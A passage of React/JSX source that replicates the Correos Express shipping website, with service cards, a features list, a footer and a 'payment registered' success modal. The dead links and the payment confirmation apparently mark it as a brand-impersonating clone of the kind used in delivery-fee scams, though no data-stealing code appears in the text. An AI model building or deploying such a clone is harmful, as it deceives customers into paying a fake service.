                  <div className="product-card-body">
                    <h3 className="product-card-title">Paq 10: entrega antes del café</h3>
                    <p className="product-card-desc">¿Tienes paquetes importantes, documentación o regalos que deben llegar antes de las 10:00 de la mañana? Paq 10 es el servicio de entrega ultrarrápida que necesitas cuando el tiempo te pisa los talones.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
              </div>
            </div>

            <div className="products-section">
              <div className="section-title">Envíos islas España y Portugal</div>
              <div className="products-grid-3">
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Islas Express cruza océanos en 48h.PNG" alt="Islas Express" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Islas Express: cruza océanos en 48h</h3>
                    <p className="product-card-desc">Que no te asuste ese mar de por medio. El paquete urgente que necesitas enviar a Canarias, Baleares, Azores o Madeira va a llegar a tiempo y en perfectas condiciones.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Islas Marítimo seguro y económico.PNG" alt="Islas Marítimo" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Islas Marítimo: seguro y económico</h3>
                    <p className="product-card-desc">Quieres enviar un paquete a las islas, pero te lo puedes tomar con cierta calma (sobre todo, si eso significa que te va a salir muy bien de precio). Entonces, Islas Marítimo es lo que buscas.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Islas Docs tus documentos vuelan.PNG" alt="Islas Docs" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Islas Docs: tus documentos vuelan</h3>
                    <p className="product-card-desc">Necesitas que ese documento urgente llegue volando. Literalmente. En Correos Express nos encargamos de conectar la España peninsular con las islas Canarias y viceversa.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
              </div>
            </div>

            <div className="products-section section-gray">
              <div className="section-title">Envíos internacionales</div>
              <div className="products-grid">
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Internacional Express entrega urgente a todo el mundo.PNG" alt="Internacional Express" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Internacional Express: entrega urgente a todo el mundo</h3>
                    <p className="product-card-desc">Cuando tienes algo importante que enviar, no hay fronteras que te frenen. Con Internacional Express de Correos Express, tus paquetes y documentos viajan rápido, seguro y sin complicaciones a más de 180 países. Porque, si hay algo que nos caracteriza, es la velocidad y la fiabilidad, ¡y eso te lo traemos sin importar el destino!</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
                <div className="product-card">
                  <div className="product-card-img">
                    <img src="/Internacional Estándar seguro, puntual y económico.PNG" alt="Internacional Estándar" referrerPolicy="no-referrer" />
                  </div>
                  <div className="product-card-body">
                    <h3 className="product-card-title">Internacional Estándar: seguro, puntual y económico</h3>
                    <p className="product-card-desc">Si necesitas enviar un paquete o documento a cualquier rincón de la Unión Europea, Internacional Estándar de Correos Express es la opción perfecta para ti. Rápido, seguro y al precio más competitivo, te ofrece la tranquilidad de saber que tus envíos llegarán puntualmente, sin importar si no son urgentes.</p>
                    <button className="btn-navy">MÁS INFO</button>
                  </div>
                </div>
              </div>
            </div>

            <div className="flexible-section">
              <div className="flexible-bg"></div>
              <div className="flexible-content">
                <h2 className="text-[32px] font-bold text-[#1e3a6e] mb-8">Conoce nuestro servicio de entrega flexible</h2>
                <div className="calendar-widget mb-8">
                  <div className="cal-header">
                    <span>Abril</span>
                    <div className="flex gap-2"><span>&lt;</span><span>&gt;</span></div>
                  </div>
                  <div className="cal-days-header">
                    <span>D</span><span>L</span><span>M</span><span>M</span><span>J</span><span>V</span><span>S</span>
                  </div>
                  <div className="cal-grid">
                    <span className="opacity-30">28</span><span className="opacity-30">29</span><span className="opacity-30">30</span><span className="opacity-30">31</span><span>1</span><span>2</span><span>3</span>
                    <span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span>
                    <span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span>
                    <span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span>
                    <span>25</span><span>26</span><span>27</span><span className="bg-[#f5c000] rounded-full w-6 h-6 flex items-center justify-center mx-auto">28</span><span>29</span><span>30</span><span className="opacity-30">1</span>
                  </div>
                </div>
                <p className="text-[18px] font-bold text-[#1e3a6e] mb-2">Nos adaptamos a la agenda de tus clientes</p>
                <p className="text-[18px] font-bold text-[#1e3a6e]">y no al revés</p>
              </div>
            </div>
          </>
        )}

        {/* Features Section */}
        <div className="features-section">
          <div className="features-title">Ventajas de nuestros envíos</div>
          <div className="features-grid">
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Recogida a domicilio</div>
              <p className="feature-desc">¿Tu paquete no tiene tiempo para salir de casa? No te preocupes, vamos a buscarlo donde nos digas. Solo avísanos al hacer tu pedido, ¡y listo!</p>
            </div>
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Trazabilidad online</div>
              <p className="feature-desc">¿Te intriga el viaje de tu envío? En nuestra web puedes seguir cada paso como si fuera el protagonista de una película: desde que sale de tus manos hasta que llega a las del destinatario.</p>
            </div>
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Entrega/Recogida del envío en la franja horaria del punto elegido</div>
              <p className="feature-desc">Más cómodo. Tendrás más horarios para recoger tu paquete y no tendrás que estar pendiente de cuándo llegará.</p>
            </div>
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Avisos por email o SMS de la disponibilidad</div>
              <p className="feature-desc">Estarás informado en todo momento cuando tu paquete llegue al punto elegido.</p>
            </div>
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Seguro de mercancía</div>
              <p className="feature-desc">Todos nuestros envíos disponen de las coberturas que actualmente establece la normativa vigente.</p>
            </div>
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Segundo intento de entrega</div>
              <p className="feature-desc">En caso de que tu envío no se pueda entregar por ausencia del destinatario, haremos un segundo intento de entrega antes del plazo de vencimiento del servicio.</p>
            </div>
            <div className="feature-item">
              <div className="feature-plus">+</div>
              <div className="feature-title">Opción de entrega en +2.300 oficinas de Correos</div>
              <p className="feature-desc">Contamos con la mayor capilaridad de oficinas de Correos para recoger, recibir y devolver tus paquetes.</p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="footer">
          <div className="footer-grid">
            <div>
              <div className="footer-col-title">Para ti</div>
              <a href="#" className="footer-link">Enviar</a>
              <a href="#" className="footer-link">Localizador de envíos</a>
              <a href="#" className="footer-link">Encuentra tu punto más cercano</a>
            </div>
            <div>
              <div className="footer-col-title">Para tu empresa</div>
              <a href="#" className="footer-link">Enviar</a>
              <a href="#" className="footer-link">Para tu negocio</a>
              <a href="#" className="footer-link">Punto Correos</a>
            </div>
            <div>
              <div className="footer-col-title">Sobre Correos Express</div>
              <a href="#" className="footer-link">Sala de prensa</a>
              <a href="#" className="footer-link">Trabaja con nosotros</a>
              <a href="#" className="footer-link">Transparencia</a>
              <a href="#" className="footer-link">Portal del empleado</a>
            </div>
            <div>
              <div className="footer-col-title">
                <div className="footer-contact-icon">
                  <HelpCircle size={18} />
                </div>
                Atención al cliente
              </div>
              <a href="#" className="footer-link">Contacto comercial</a>
              <a href="#" className="footer-link">Canal ético</a>
              <div className="rrss mt-4">
                <div className="rrss-icon">𝕏</div>
                <div className="rrss-icon">in</div>
                <div className="rrss-icon">f</div>
                <div className="rrss-icon">📷</div>
              </div>
            </div>
          </div>
          <div className="footer-divider"></div>
          <div className="footer-apps-pay">
            <div className="flex flex-col gap-6">
              <img src="/logocorreoblanco.PNG" alt="Correos Express" className="h-10 w-fit object-contain" referrerPolicy="no-referrer" />
              <div>
                <div className="footer-apps-title">Descarga la nueva App de Correos Express</div>
                <div className="footer-apps">
                  <img src="/appstore.PNG" alt="App Store" className="h-10 cursor-pointer" referrerPolicy="no-referrer" />
                  <img src="/playstore.PNG" alt="Google Play" className="h-10 cursor-pointer" referrerPolicy="no-referrer" />
                </div>
              </div>
            </div>
            <div>
              <div className="footer-apps-title">Métodos de pago</div>
              <div className="pay-methods">
                <div className="pay-badge">VISA</div>
                <div className="pay-badge">MasterCard</div>
                <div className="pay-badge">Maestro</div>
              </div>
            </div>
          </div>
          <div className="footer-bottom">
            <div className="footer-legal-links">
              <a href="#" className="footer-legal-link">Política de cookies</a>
              <a href="#" className="footer-legal-link">Aviso legal</a>
              <a href="#" className="footer-legal-link">Privacidad web</a>
              <a href="#" className="footer-legal-link">Alerta seguridad</a>
              <a href="#" className="footer-legal-link">Accesibilidad</a>
              <a href="#" className="footer-legal-link">Configurador cookies</a>
              <a href="#" className="footer-legal-link">Correos Express Portugal</a>
            </div>
            <div className="footer-copyright">Correos Express Paquetería Urgente, SA SME. Todos los derechos reservados.</div>
          </div>
        </footer>
      </main>
      {/* Success Modal */}
      <AnimatePresence>
        {showSuccessModal && (
          <div className="fixed inset-0 z-[2000] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative bg-white rounded-2xl shadow-2xl max-w-[500px] w-full overflow-hidden"
            >
              <div className="bg-[#f5c000] p-8 flex justify-center">
                <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center shadow-inner">
                  <CheckCircle2 size={64} className="text-[#1e3a6e]" />
                </div>
              </div>
              <div className="p-8 text-center">
                <h2 className="text-[24px] font-black text-[#1e3a6e] mb-4">¡Todo listo! Pago registrado✅</h2>
                <p className="text-[16px] text-gray-600 leading-relaxed mb-8">
                  Su transacción se ha procesado con éxito. El paquete ya se encuentra en el área de expedición y pronto estará en camino hacia su destino. Gracias por confiar en nuestro servicio.
                </p>
                
                <div className="flex justify-center mb-8">
                  <img 
                    src="/correosamarillo.PNG" 
                    alt="Correos Logo" 
                    className="h-20 object-contain"
                    referrerPolicy="no-referrer"
                  />
                </div>

                <button 
                  onClick={resetApp}
                  className="w-full bg-[#1e3a6e] text-white py-4 rounded-xl font-bold hover:bg-[#152a50] transition-all flex items-center justify-center gap-2 shadow-lg"
                >
                  Volver al inicio
                  <ChevronRight size={20} />
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
